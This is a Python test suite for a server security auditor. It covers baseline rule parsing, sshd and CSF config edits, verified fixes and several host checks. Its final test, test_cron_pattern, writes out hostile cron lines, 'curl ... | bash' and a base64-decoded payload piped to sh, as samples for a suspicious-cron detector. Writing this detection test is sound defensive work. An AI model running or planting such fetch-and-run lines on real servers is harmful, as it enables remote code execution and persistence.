"""Tests for baseline.conf: parsing, matching, file edits, and fix verification.

A baseline rule is our own standard, so a misread here is a false FAIL on
every server we run it on.
"""

import os
import shutil
import tempfile
import unittest
from unittest import mock

from auditor.checks import baseline, standards
from auditor.core.model import Status
from auditor.core.registry import REGISTRY
from auditor.core.remediate import Remediator
from auditor.core.report import Reporter
from auditor.core.util import read_file


def only(gen):
    results = list(gen)
    assert len(results) == 1, "expected one finding, got %d" % len(results)
    return results[0]


class TempDir(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp()
        read_file.cache_clear()

    def tearDown(self):
        shutil.rmtree(self.dir)
        read_file.cache_clear()
        baseline.load(os.devnull)

    def write(self, name, text):
        path = os.path.join(self.dir, name)
        with open(path, "w") as fh:
            fh.write(text)
        return path


class TestSame(unittest.TestCase):
    def test_booleans_and_case(self):
        for want, got in [("Off", "0"), ("no", "NO"), ("on", "1"), ("yes", "true")]:
            self.assertTrue(baseline.same(want, got), (want, got))
        self.assertFalse(baseline.same("Off", "On"))

    def test_ranges(self):
        self.assertTrue(baseline.same("<=4", "3"))
        self.assertTrue(baseline.same("<=4", "4"))
        self.assertFalse(baseline.same("<=4", "6"))
        self.assertTrue(baseline.same(">=2", "2"))
        self.assertFalse(baseline.same("<4", "abc"))

    def test_aliases(self):
        self.assertTrue(baseline.same("prohibit-password", "without-password"))
        self.assertTrue(baseline.same("ProductOnly", "Prod"))

    def test_unset_never_matches(self):
        self.assertFalse(baseline.same("0", None))


class TestParse(unittest.TestCase):
    TEXT = """
# comment
set ROOT_ALERT_EMAIL "ops@example.com"   # trailing comment
[SSH]
sshd PermitRootLogin no | Root cannot log in
warn:sshd MaxAuthTries <=4
bogus_rule foo
sshd
[Server]
timezone Asia/Bahrain
"""

    def test_rules_settings_and_errors(self):
        rules, settings, errors = baseline.parse(self.TEXT)
        self.assertEqual([r.rtype for r in rules], ["sshd", "sshd", "timezone"])
        self.assertEqual(rules[0].label, "Root cannot log in")
        self.assertEqual(rules[0].section, "SSH")
        self.assertTrue(rules[1].warn_only)
        self.assertEqual(rules[2].section, "Server")
        self.assertEqual(settings, {"ROOT_ALERT_EMAIL": "ops@example.com"})
        self.assertEqual(len(errors), 2)
        self.assertIn("unknown rule type 'bogus_rule'", errors[0])
        self.assertIn("needs at least 2", errors[1])

    def test_ids_are_stable_and_unique(self):
        rules, _, _ = baseline.parse("sshd Port 22\nsshd Port 2222\n"
                                     "file_kv /etc/csf/csf.conf TESTING 0\n")
        taken = set()
        ids = [baseline.check_id(r, taken) for r in rules]
        self.assertEqual(ids, ["BL-SSHD-PORT", "BL-SSHD-PORT-2", "BL-CSF-TESTING"])


class TestLoad(TempDir):
    def test_registers_checks_and_replaces_on_reload(self):
        path = self.write("b.conf", "[SSH]\nsshd PermitRootLogin no\nnope x\n")
        self.assertEqual(baseline.load(path), 1)
        ids = [s.id for s in REGISTRY if s.id.startswith("BL-")]
        self.assertEqual(sorted(ids), ["BL-CONFIG", "BL-SSHD-PERMITROOTLOGIN"])
        spec = next(s for s in REGISTRY if s.id == "BL-SSHD-PERMITROOTLOGIN")
        self.assertEqual(spec.category, "Baseline: SSH")
        baseline.load(path)
        self.assertEqual(len([s for s in REGISTRY if s.id.startswith("BL-")]), 2)

    def test_missing_default_file_means_no_baseline(self):
        self.assertEqual(baseline.load(os.path.join(self.dir, "absent")), 0)
        self.assertFalse(any(s.id.startswith("BL-") for s in REGISTRY))

    def test_shipped_baseline_parses_cleanly(self):
        _, _, errors = baseline.parse(read_file(baseline.DEFAULT_PATH))
        self.assertEqual(errors, [])


class TestKeyValueFiles(TempDir):
    def test_get_formats(self):
        text = ('# TESTING = "0"\nTESTING = "1"\nTCP_IN = "20,21,22"\n'
                "allow_url_include = On ; note\nTLS 1\nUPDATES=manual\n")
        self.assertEqual(baseline.kv_get(text, "TESTING"), "1")
        self.assertEqual(baseline.kv_get(text, "TCP_IN"), "20,21,22")
        self.assertEqual(baseline.kv_get(text, "allow_url_include"), "On")
        self.assertEqual(baseline.kv_get(text, "TLS"), "1")
        self.assertEqual(baseline.kv_get(text, "UPDATES"), "manual")
        self.assertIsNone(baseline.kv_get(text, "TEST"))

    def test_set_keeps_csf_quotes(self):
        """CSF needs KEY = "value"; dropping the quotes breaks csf.conf."""
        path = self.write("csf.conf", '# TESTING = "1"\nTESTING = "1"\n')
        self.assertTrue(baseline.kv_set(path, "TESTING", "0"))
        self.assertEqual(read_file(path), '# TESTING = "1"\nTESTING = "0"\n')

    def test_set_appends_in_file_style(self):
        quoted = self.write("a.conf", 'A = "1"\n')
        bare = self.write("b.conf", "A=1\n")
        spaced = self.write("c.conf", "A 1\n")
        for path in (quoted, bare, spaced):
            baseline.kv_set(path, "NEW", "x")
        self.assertTrue(read_file(quoted).endswith('NEW = "x"\n'))
        self.assertTrue(read_file(bare).endswith("NEW=x\n"))
        self.assertTrue(read_file(spaced).endswith("NEW x\n"))

    def test_managed_file_is_never_auto_fixed(self):
        path = self.write("pure-ftpd.conf", "NoAnonymous no\n")
        with mock.patch.dict(baseline.MANAGED_FILES, {path: "WHM > FTP"}):
            out = baseline.rule_file_kv([path, "NoAnonymous", "yes"])
        self.assertFalse(out.ok)
        self.assertFalse(out.remediation.automatable)
        self.assertIn("WHM > FTP", out.remediation.manual)


class TestSshdRule(unittest.TestCase):
    def outcome(self, cfg, *args):
        with mock.patch.object(baseline, "sshd_config", return_value=cfg), \
                mock.patch.object(baseline, "sshd_files", return_value=[]):
            return baseline.rule_sshd(list(args))

    def test_match_and_mismatch(self):
        self.assertTrue(self.outcome({"permitrootlogin": "no"},
                                     "PermitRootLogin", "no").ok)
        out = self.outcome({"permitrootlogin": "without-password"},
                           "PermitRootLogin", "no")
        self.assertFalse(out.ok)
        self.assertIn("found 'without-password'", out.detail)
        self.assertTrue(out.remediation.risky)

    def test_unreadable_is_skip(self):
        self.assertIsNone(self.outcome(None, "PermitRootLogin", "no").ok)

    def test_absent_directive_uses_openssh_default(self):
        """Without sshd -T an absent directive means the default, not a FAIL."""
        self.assertTrue(self.outcome({"port": "22"},
                                     "PermitEmptyPasswords", "no").ok)
        out = self.outcome({"port": "22"}, "PermitRootLogin", "no")
        self.assertFalse(out.ok)
        self.assertIn("default 'prohibit-password'", out.detail)

    def test_range_has_no_fix(self):
        out = self.outcome({"maxauthtries": "6"}, "MaxAuthTries", "<=4")
        self.assertFalse(out.ok)
        self.assertIsNone(out.remediation)


class TestSshdSet(TempDir):
    def test_new_directive_goes_before_match_block(self):
        main = self.write("sshd_config",
                          "Port 22\nMatch User backup\n    X11Forwarding yes\n")
        with mock.patch.object(baseline, "SSHD_MAIN", main), \
                mock.patch.object(baseline, "sshd_files", return_value=[main]):
            self.assertTrue(baseline._sshd_set("PermitRootLogin", "no"))
        self.assertEqual(read_file(main).splitlines()[:2],
                         ["Port 22", "PermitRootLogin no"])


class TestWarnModifierAndFixFlow(TempDir):
    def test_warn_modifier_and_verified_fix(self):
        conf = self.write("app.conf", 'LF_DAEMON = "0"\nTESTING = "1"\n')
        path = self.write("b.conf", "warn:file_kv %s LF_DAEMON 1\n"
                                    "file_kv %s TESTING 0\n" % (conf, conf))
        baseline.load(path)
        specs = [s for s in REGISTRY if s.id.startswith("BL-")]
        warn = only(specs[0].func())
        fail = only(specs[1].func())
        self.assertEqual((warn.status, fail.status), (Status.WARN, Status.FAIL))

        reporter = Reporter(log_path=None, use_color=False, silent=True)
        notes = []
        reporter.note = notes.append
        reporter.finding(fail)
        rem = Remediator(reporter, assume_yes=True)
        rem.handle(fail, specs[1])
        self.assertEqual(rem.applied, 1, notes)
        self.assertIn('TESTING = "0"', read_file(conf))
        self.assertTrue(any("Applied and verified." in n for n in notes))
        for name in os.listdir(self.dir):
            if ".auditor-bak-" in name:
                break
        else:
            self.fail("no backup written")


class TestRootAlert(TempDir):
    def test_missing_alert_offers_fix_only_with_email(self):
        bashrc = self.write("bashrc", "alias ll='ls -l'\n")
        with mock.patch.object(standards, "ROOT_BASHRC", bashrc):
            finding = only(standards.root_alert())
            self.assertEqual(finding.status, Status.FAIL)
            self.assertFalse(finding.remediation.automatable)
            with mock.patch.dict(baseline.SETTINGS, {"ROOT_ALERT_EMAIL": "ops@example.com"}):
                finding = only(standards.root_alert())
                self.assertTrue(finding.remediation.automatable)
                self.assertTrue(finding.remediation.func())
            read_file.cache_clear()
            with mock.patch.object(standards, "which", return_value="/usr/bin/mail"):
                after = only(standards.root_alert())
        self.assertEqual(after.status, Status.OK)
        self.assertIn("ops@example.com", after.title)


class TestStandards(unittest.TestCase):
    def test_fqdn_check(self):
        with mock.patch.object(standards, "fqdn", return_value="laptop"):
            self.assertEqual(only(standards.hostname()).status, Status.FAIL)
        with mock.patch.object(standards, "fqdn", return_value="srv.example.com"), \
                mock.patch.object(standards, "main_ip", return_value="203.0.113.5"), \
                mock.patch.object(standards, "dns_a", return_value=["203.0.113.5"]):
            self.assertEqual(only(standards.hostname()).status, Status.OK)
        with mock.patch.object(standards, "fqdn", return_value="srv.example.com"), \
                mock.patch.object(standards, "main_ip", return_value="203.0.113.5"), \
                mock.patch.object(standards, "dns_a", return_value=["198.51.100.1"]):
            self.assertEqual(only(standards.hostname()).status, Status.FAIL)

    def test_uid0(self):
        passwd = "root:x:0:0::/root:/bin/bash\ntoor:x:0:0::/root:/bin/bash\n"
        with mock.patch.object(standards, "read_file", return_value=passwd):
            finding = only(standards.extra_uid0())
        self.assertEqual(finding.status, Status.FAIL)
        self.assertIn("toor", finding.detail)

    def test_cron_pattern(self):
        self.assertTrue(standards.SUSPICIOUS_CRON.search(
            "* * * * * curl -s http://x/y | bash"))
        self.assertTrue(standards.SUSPICIOUS_CRON.search("echo Zm9v | base64 -d | sh"))
        self.assertFalse(standards.SUSPICIOUS_CRON.search(
            "0 1 * * * /usr/local/cpanel/scripts/upcp --cron"))


if __name__ == "__main__":
    unittest.main()
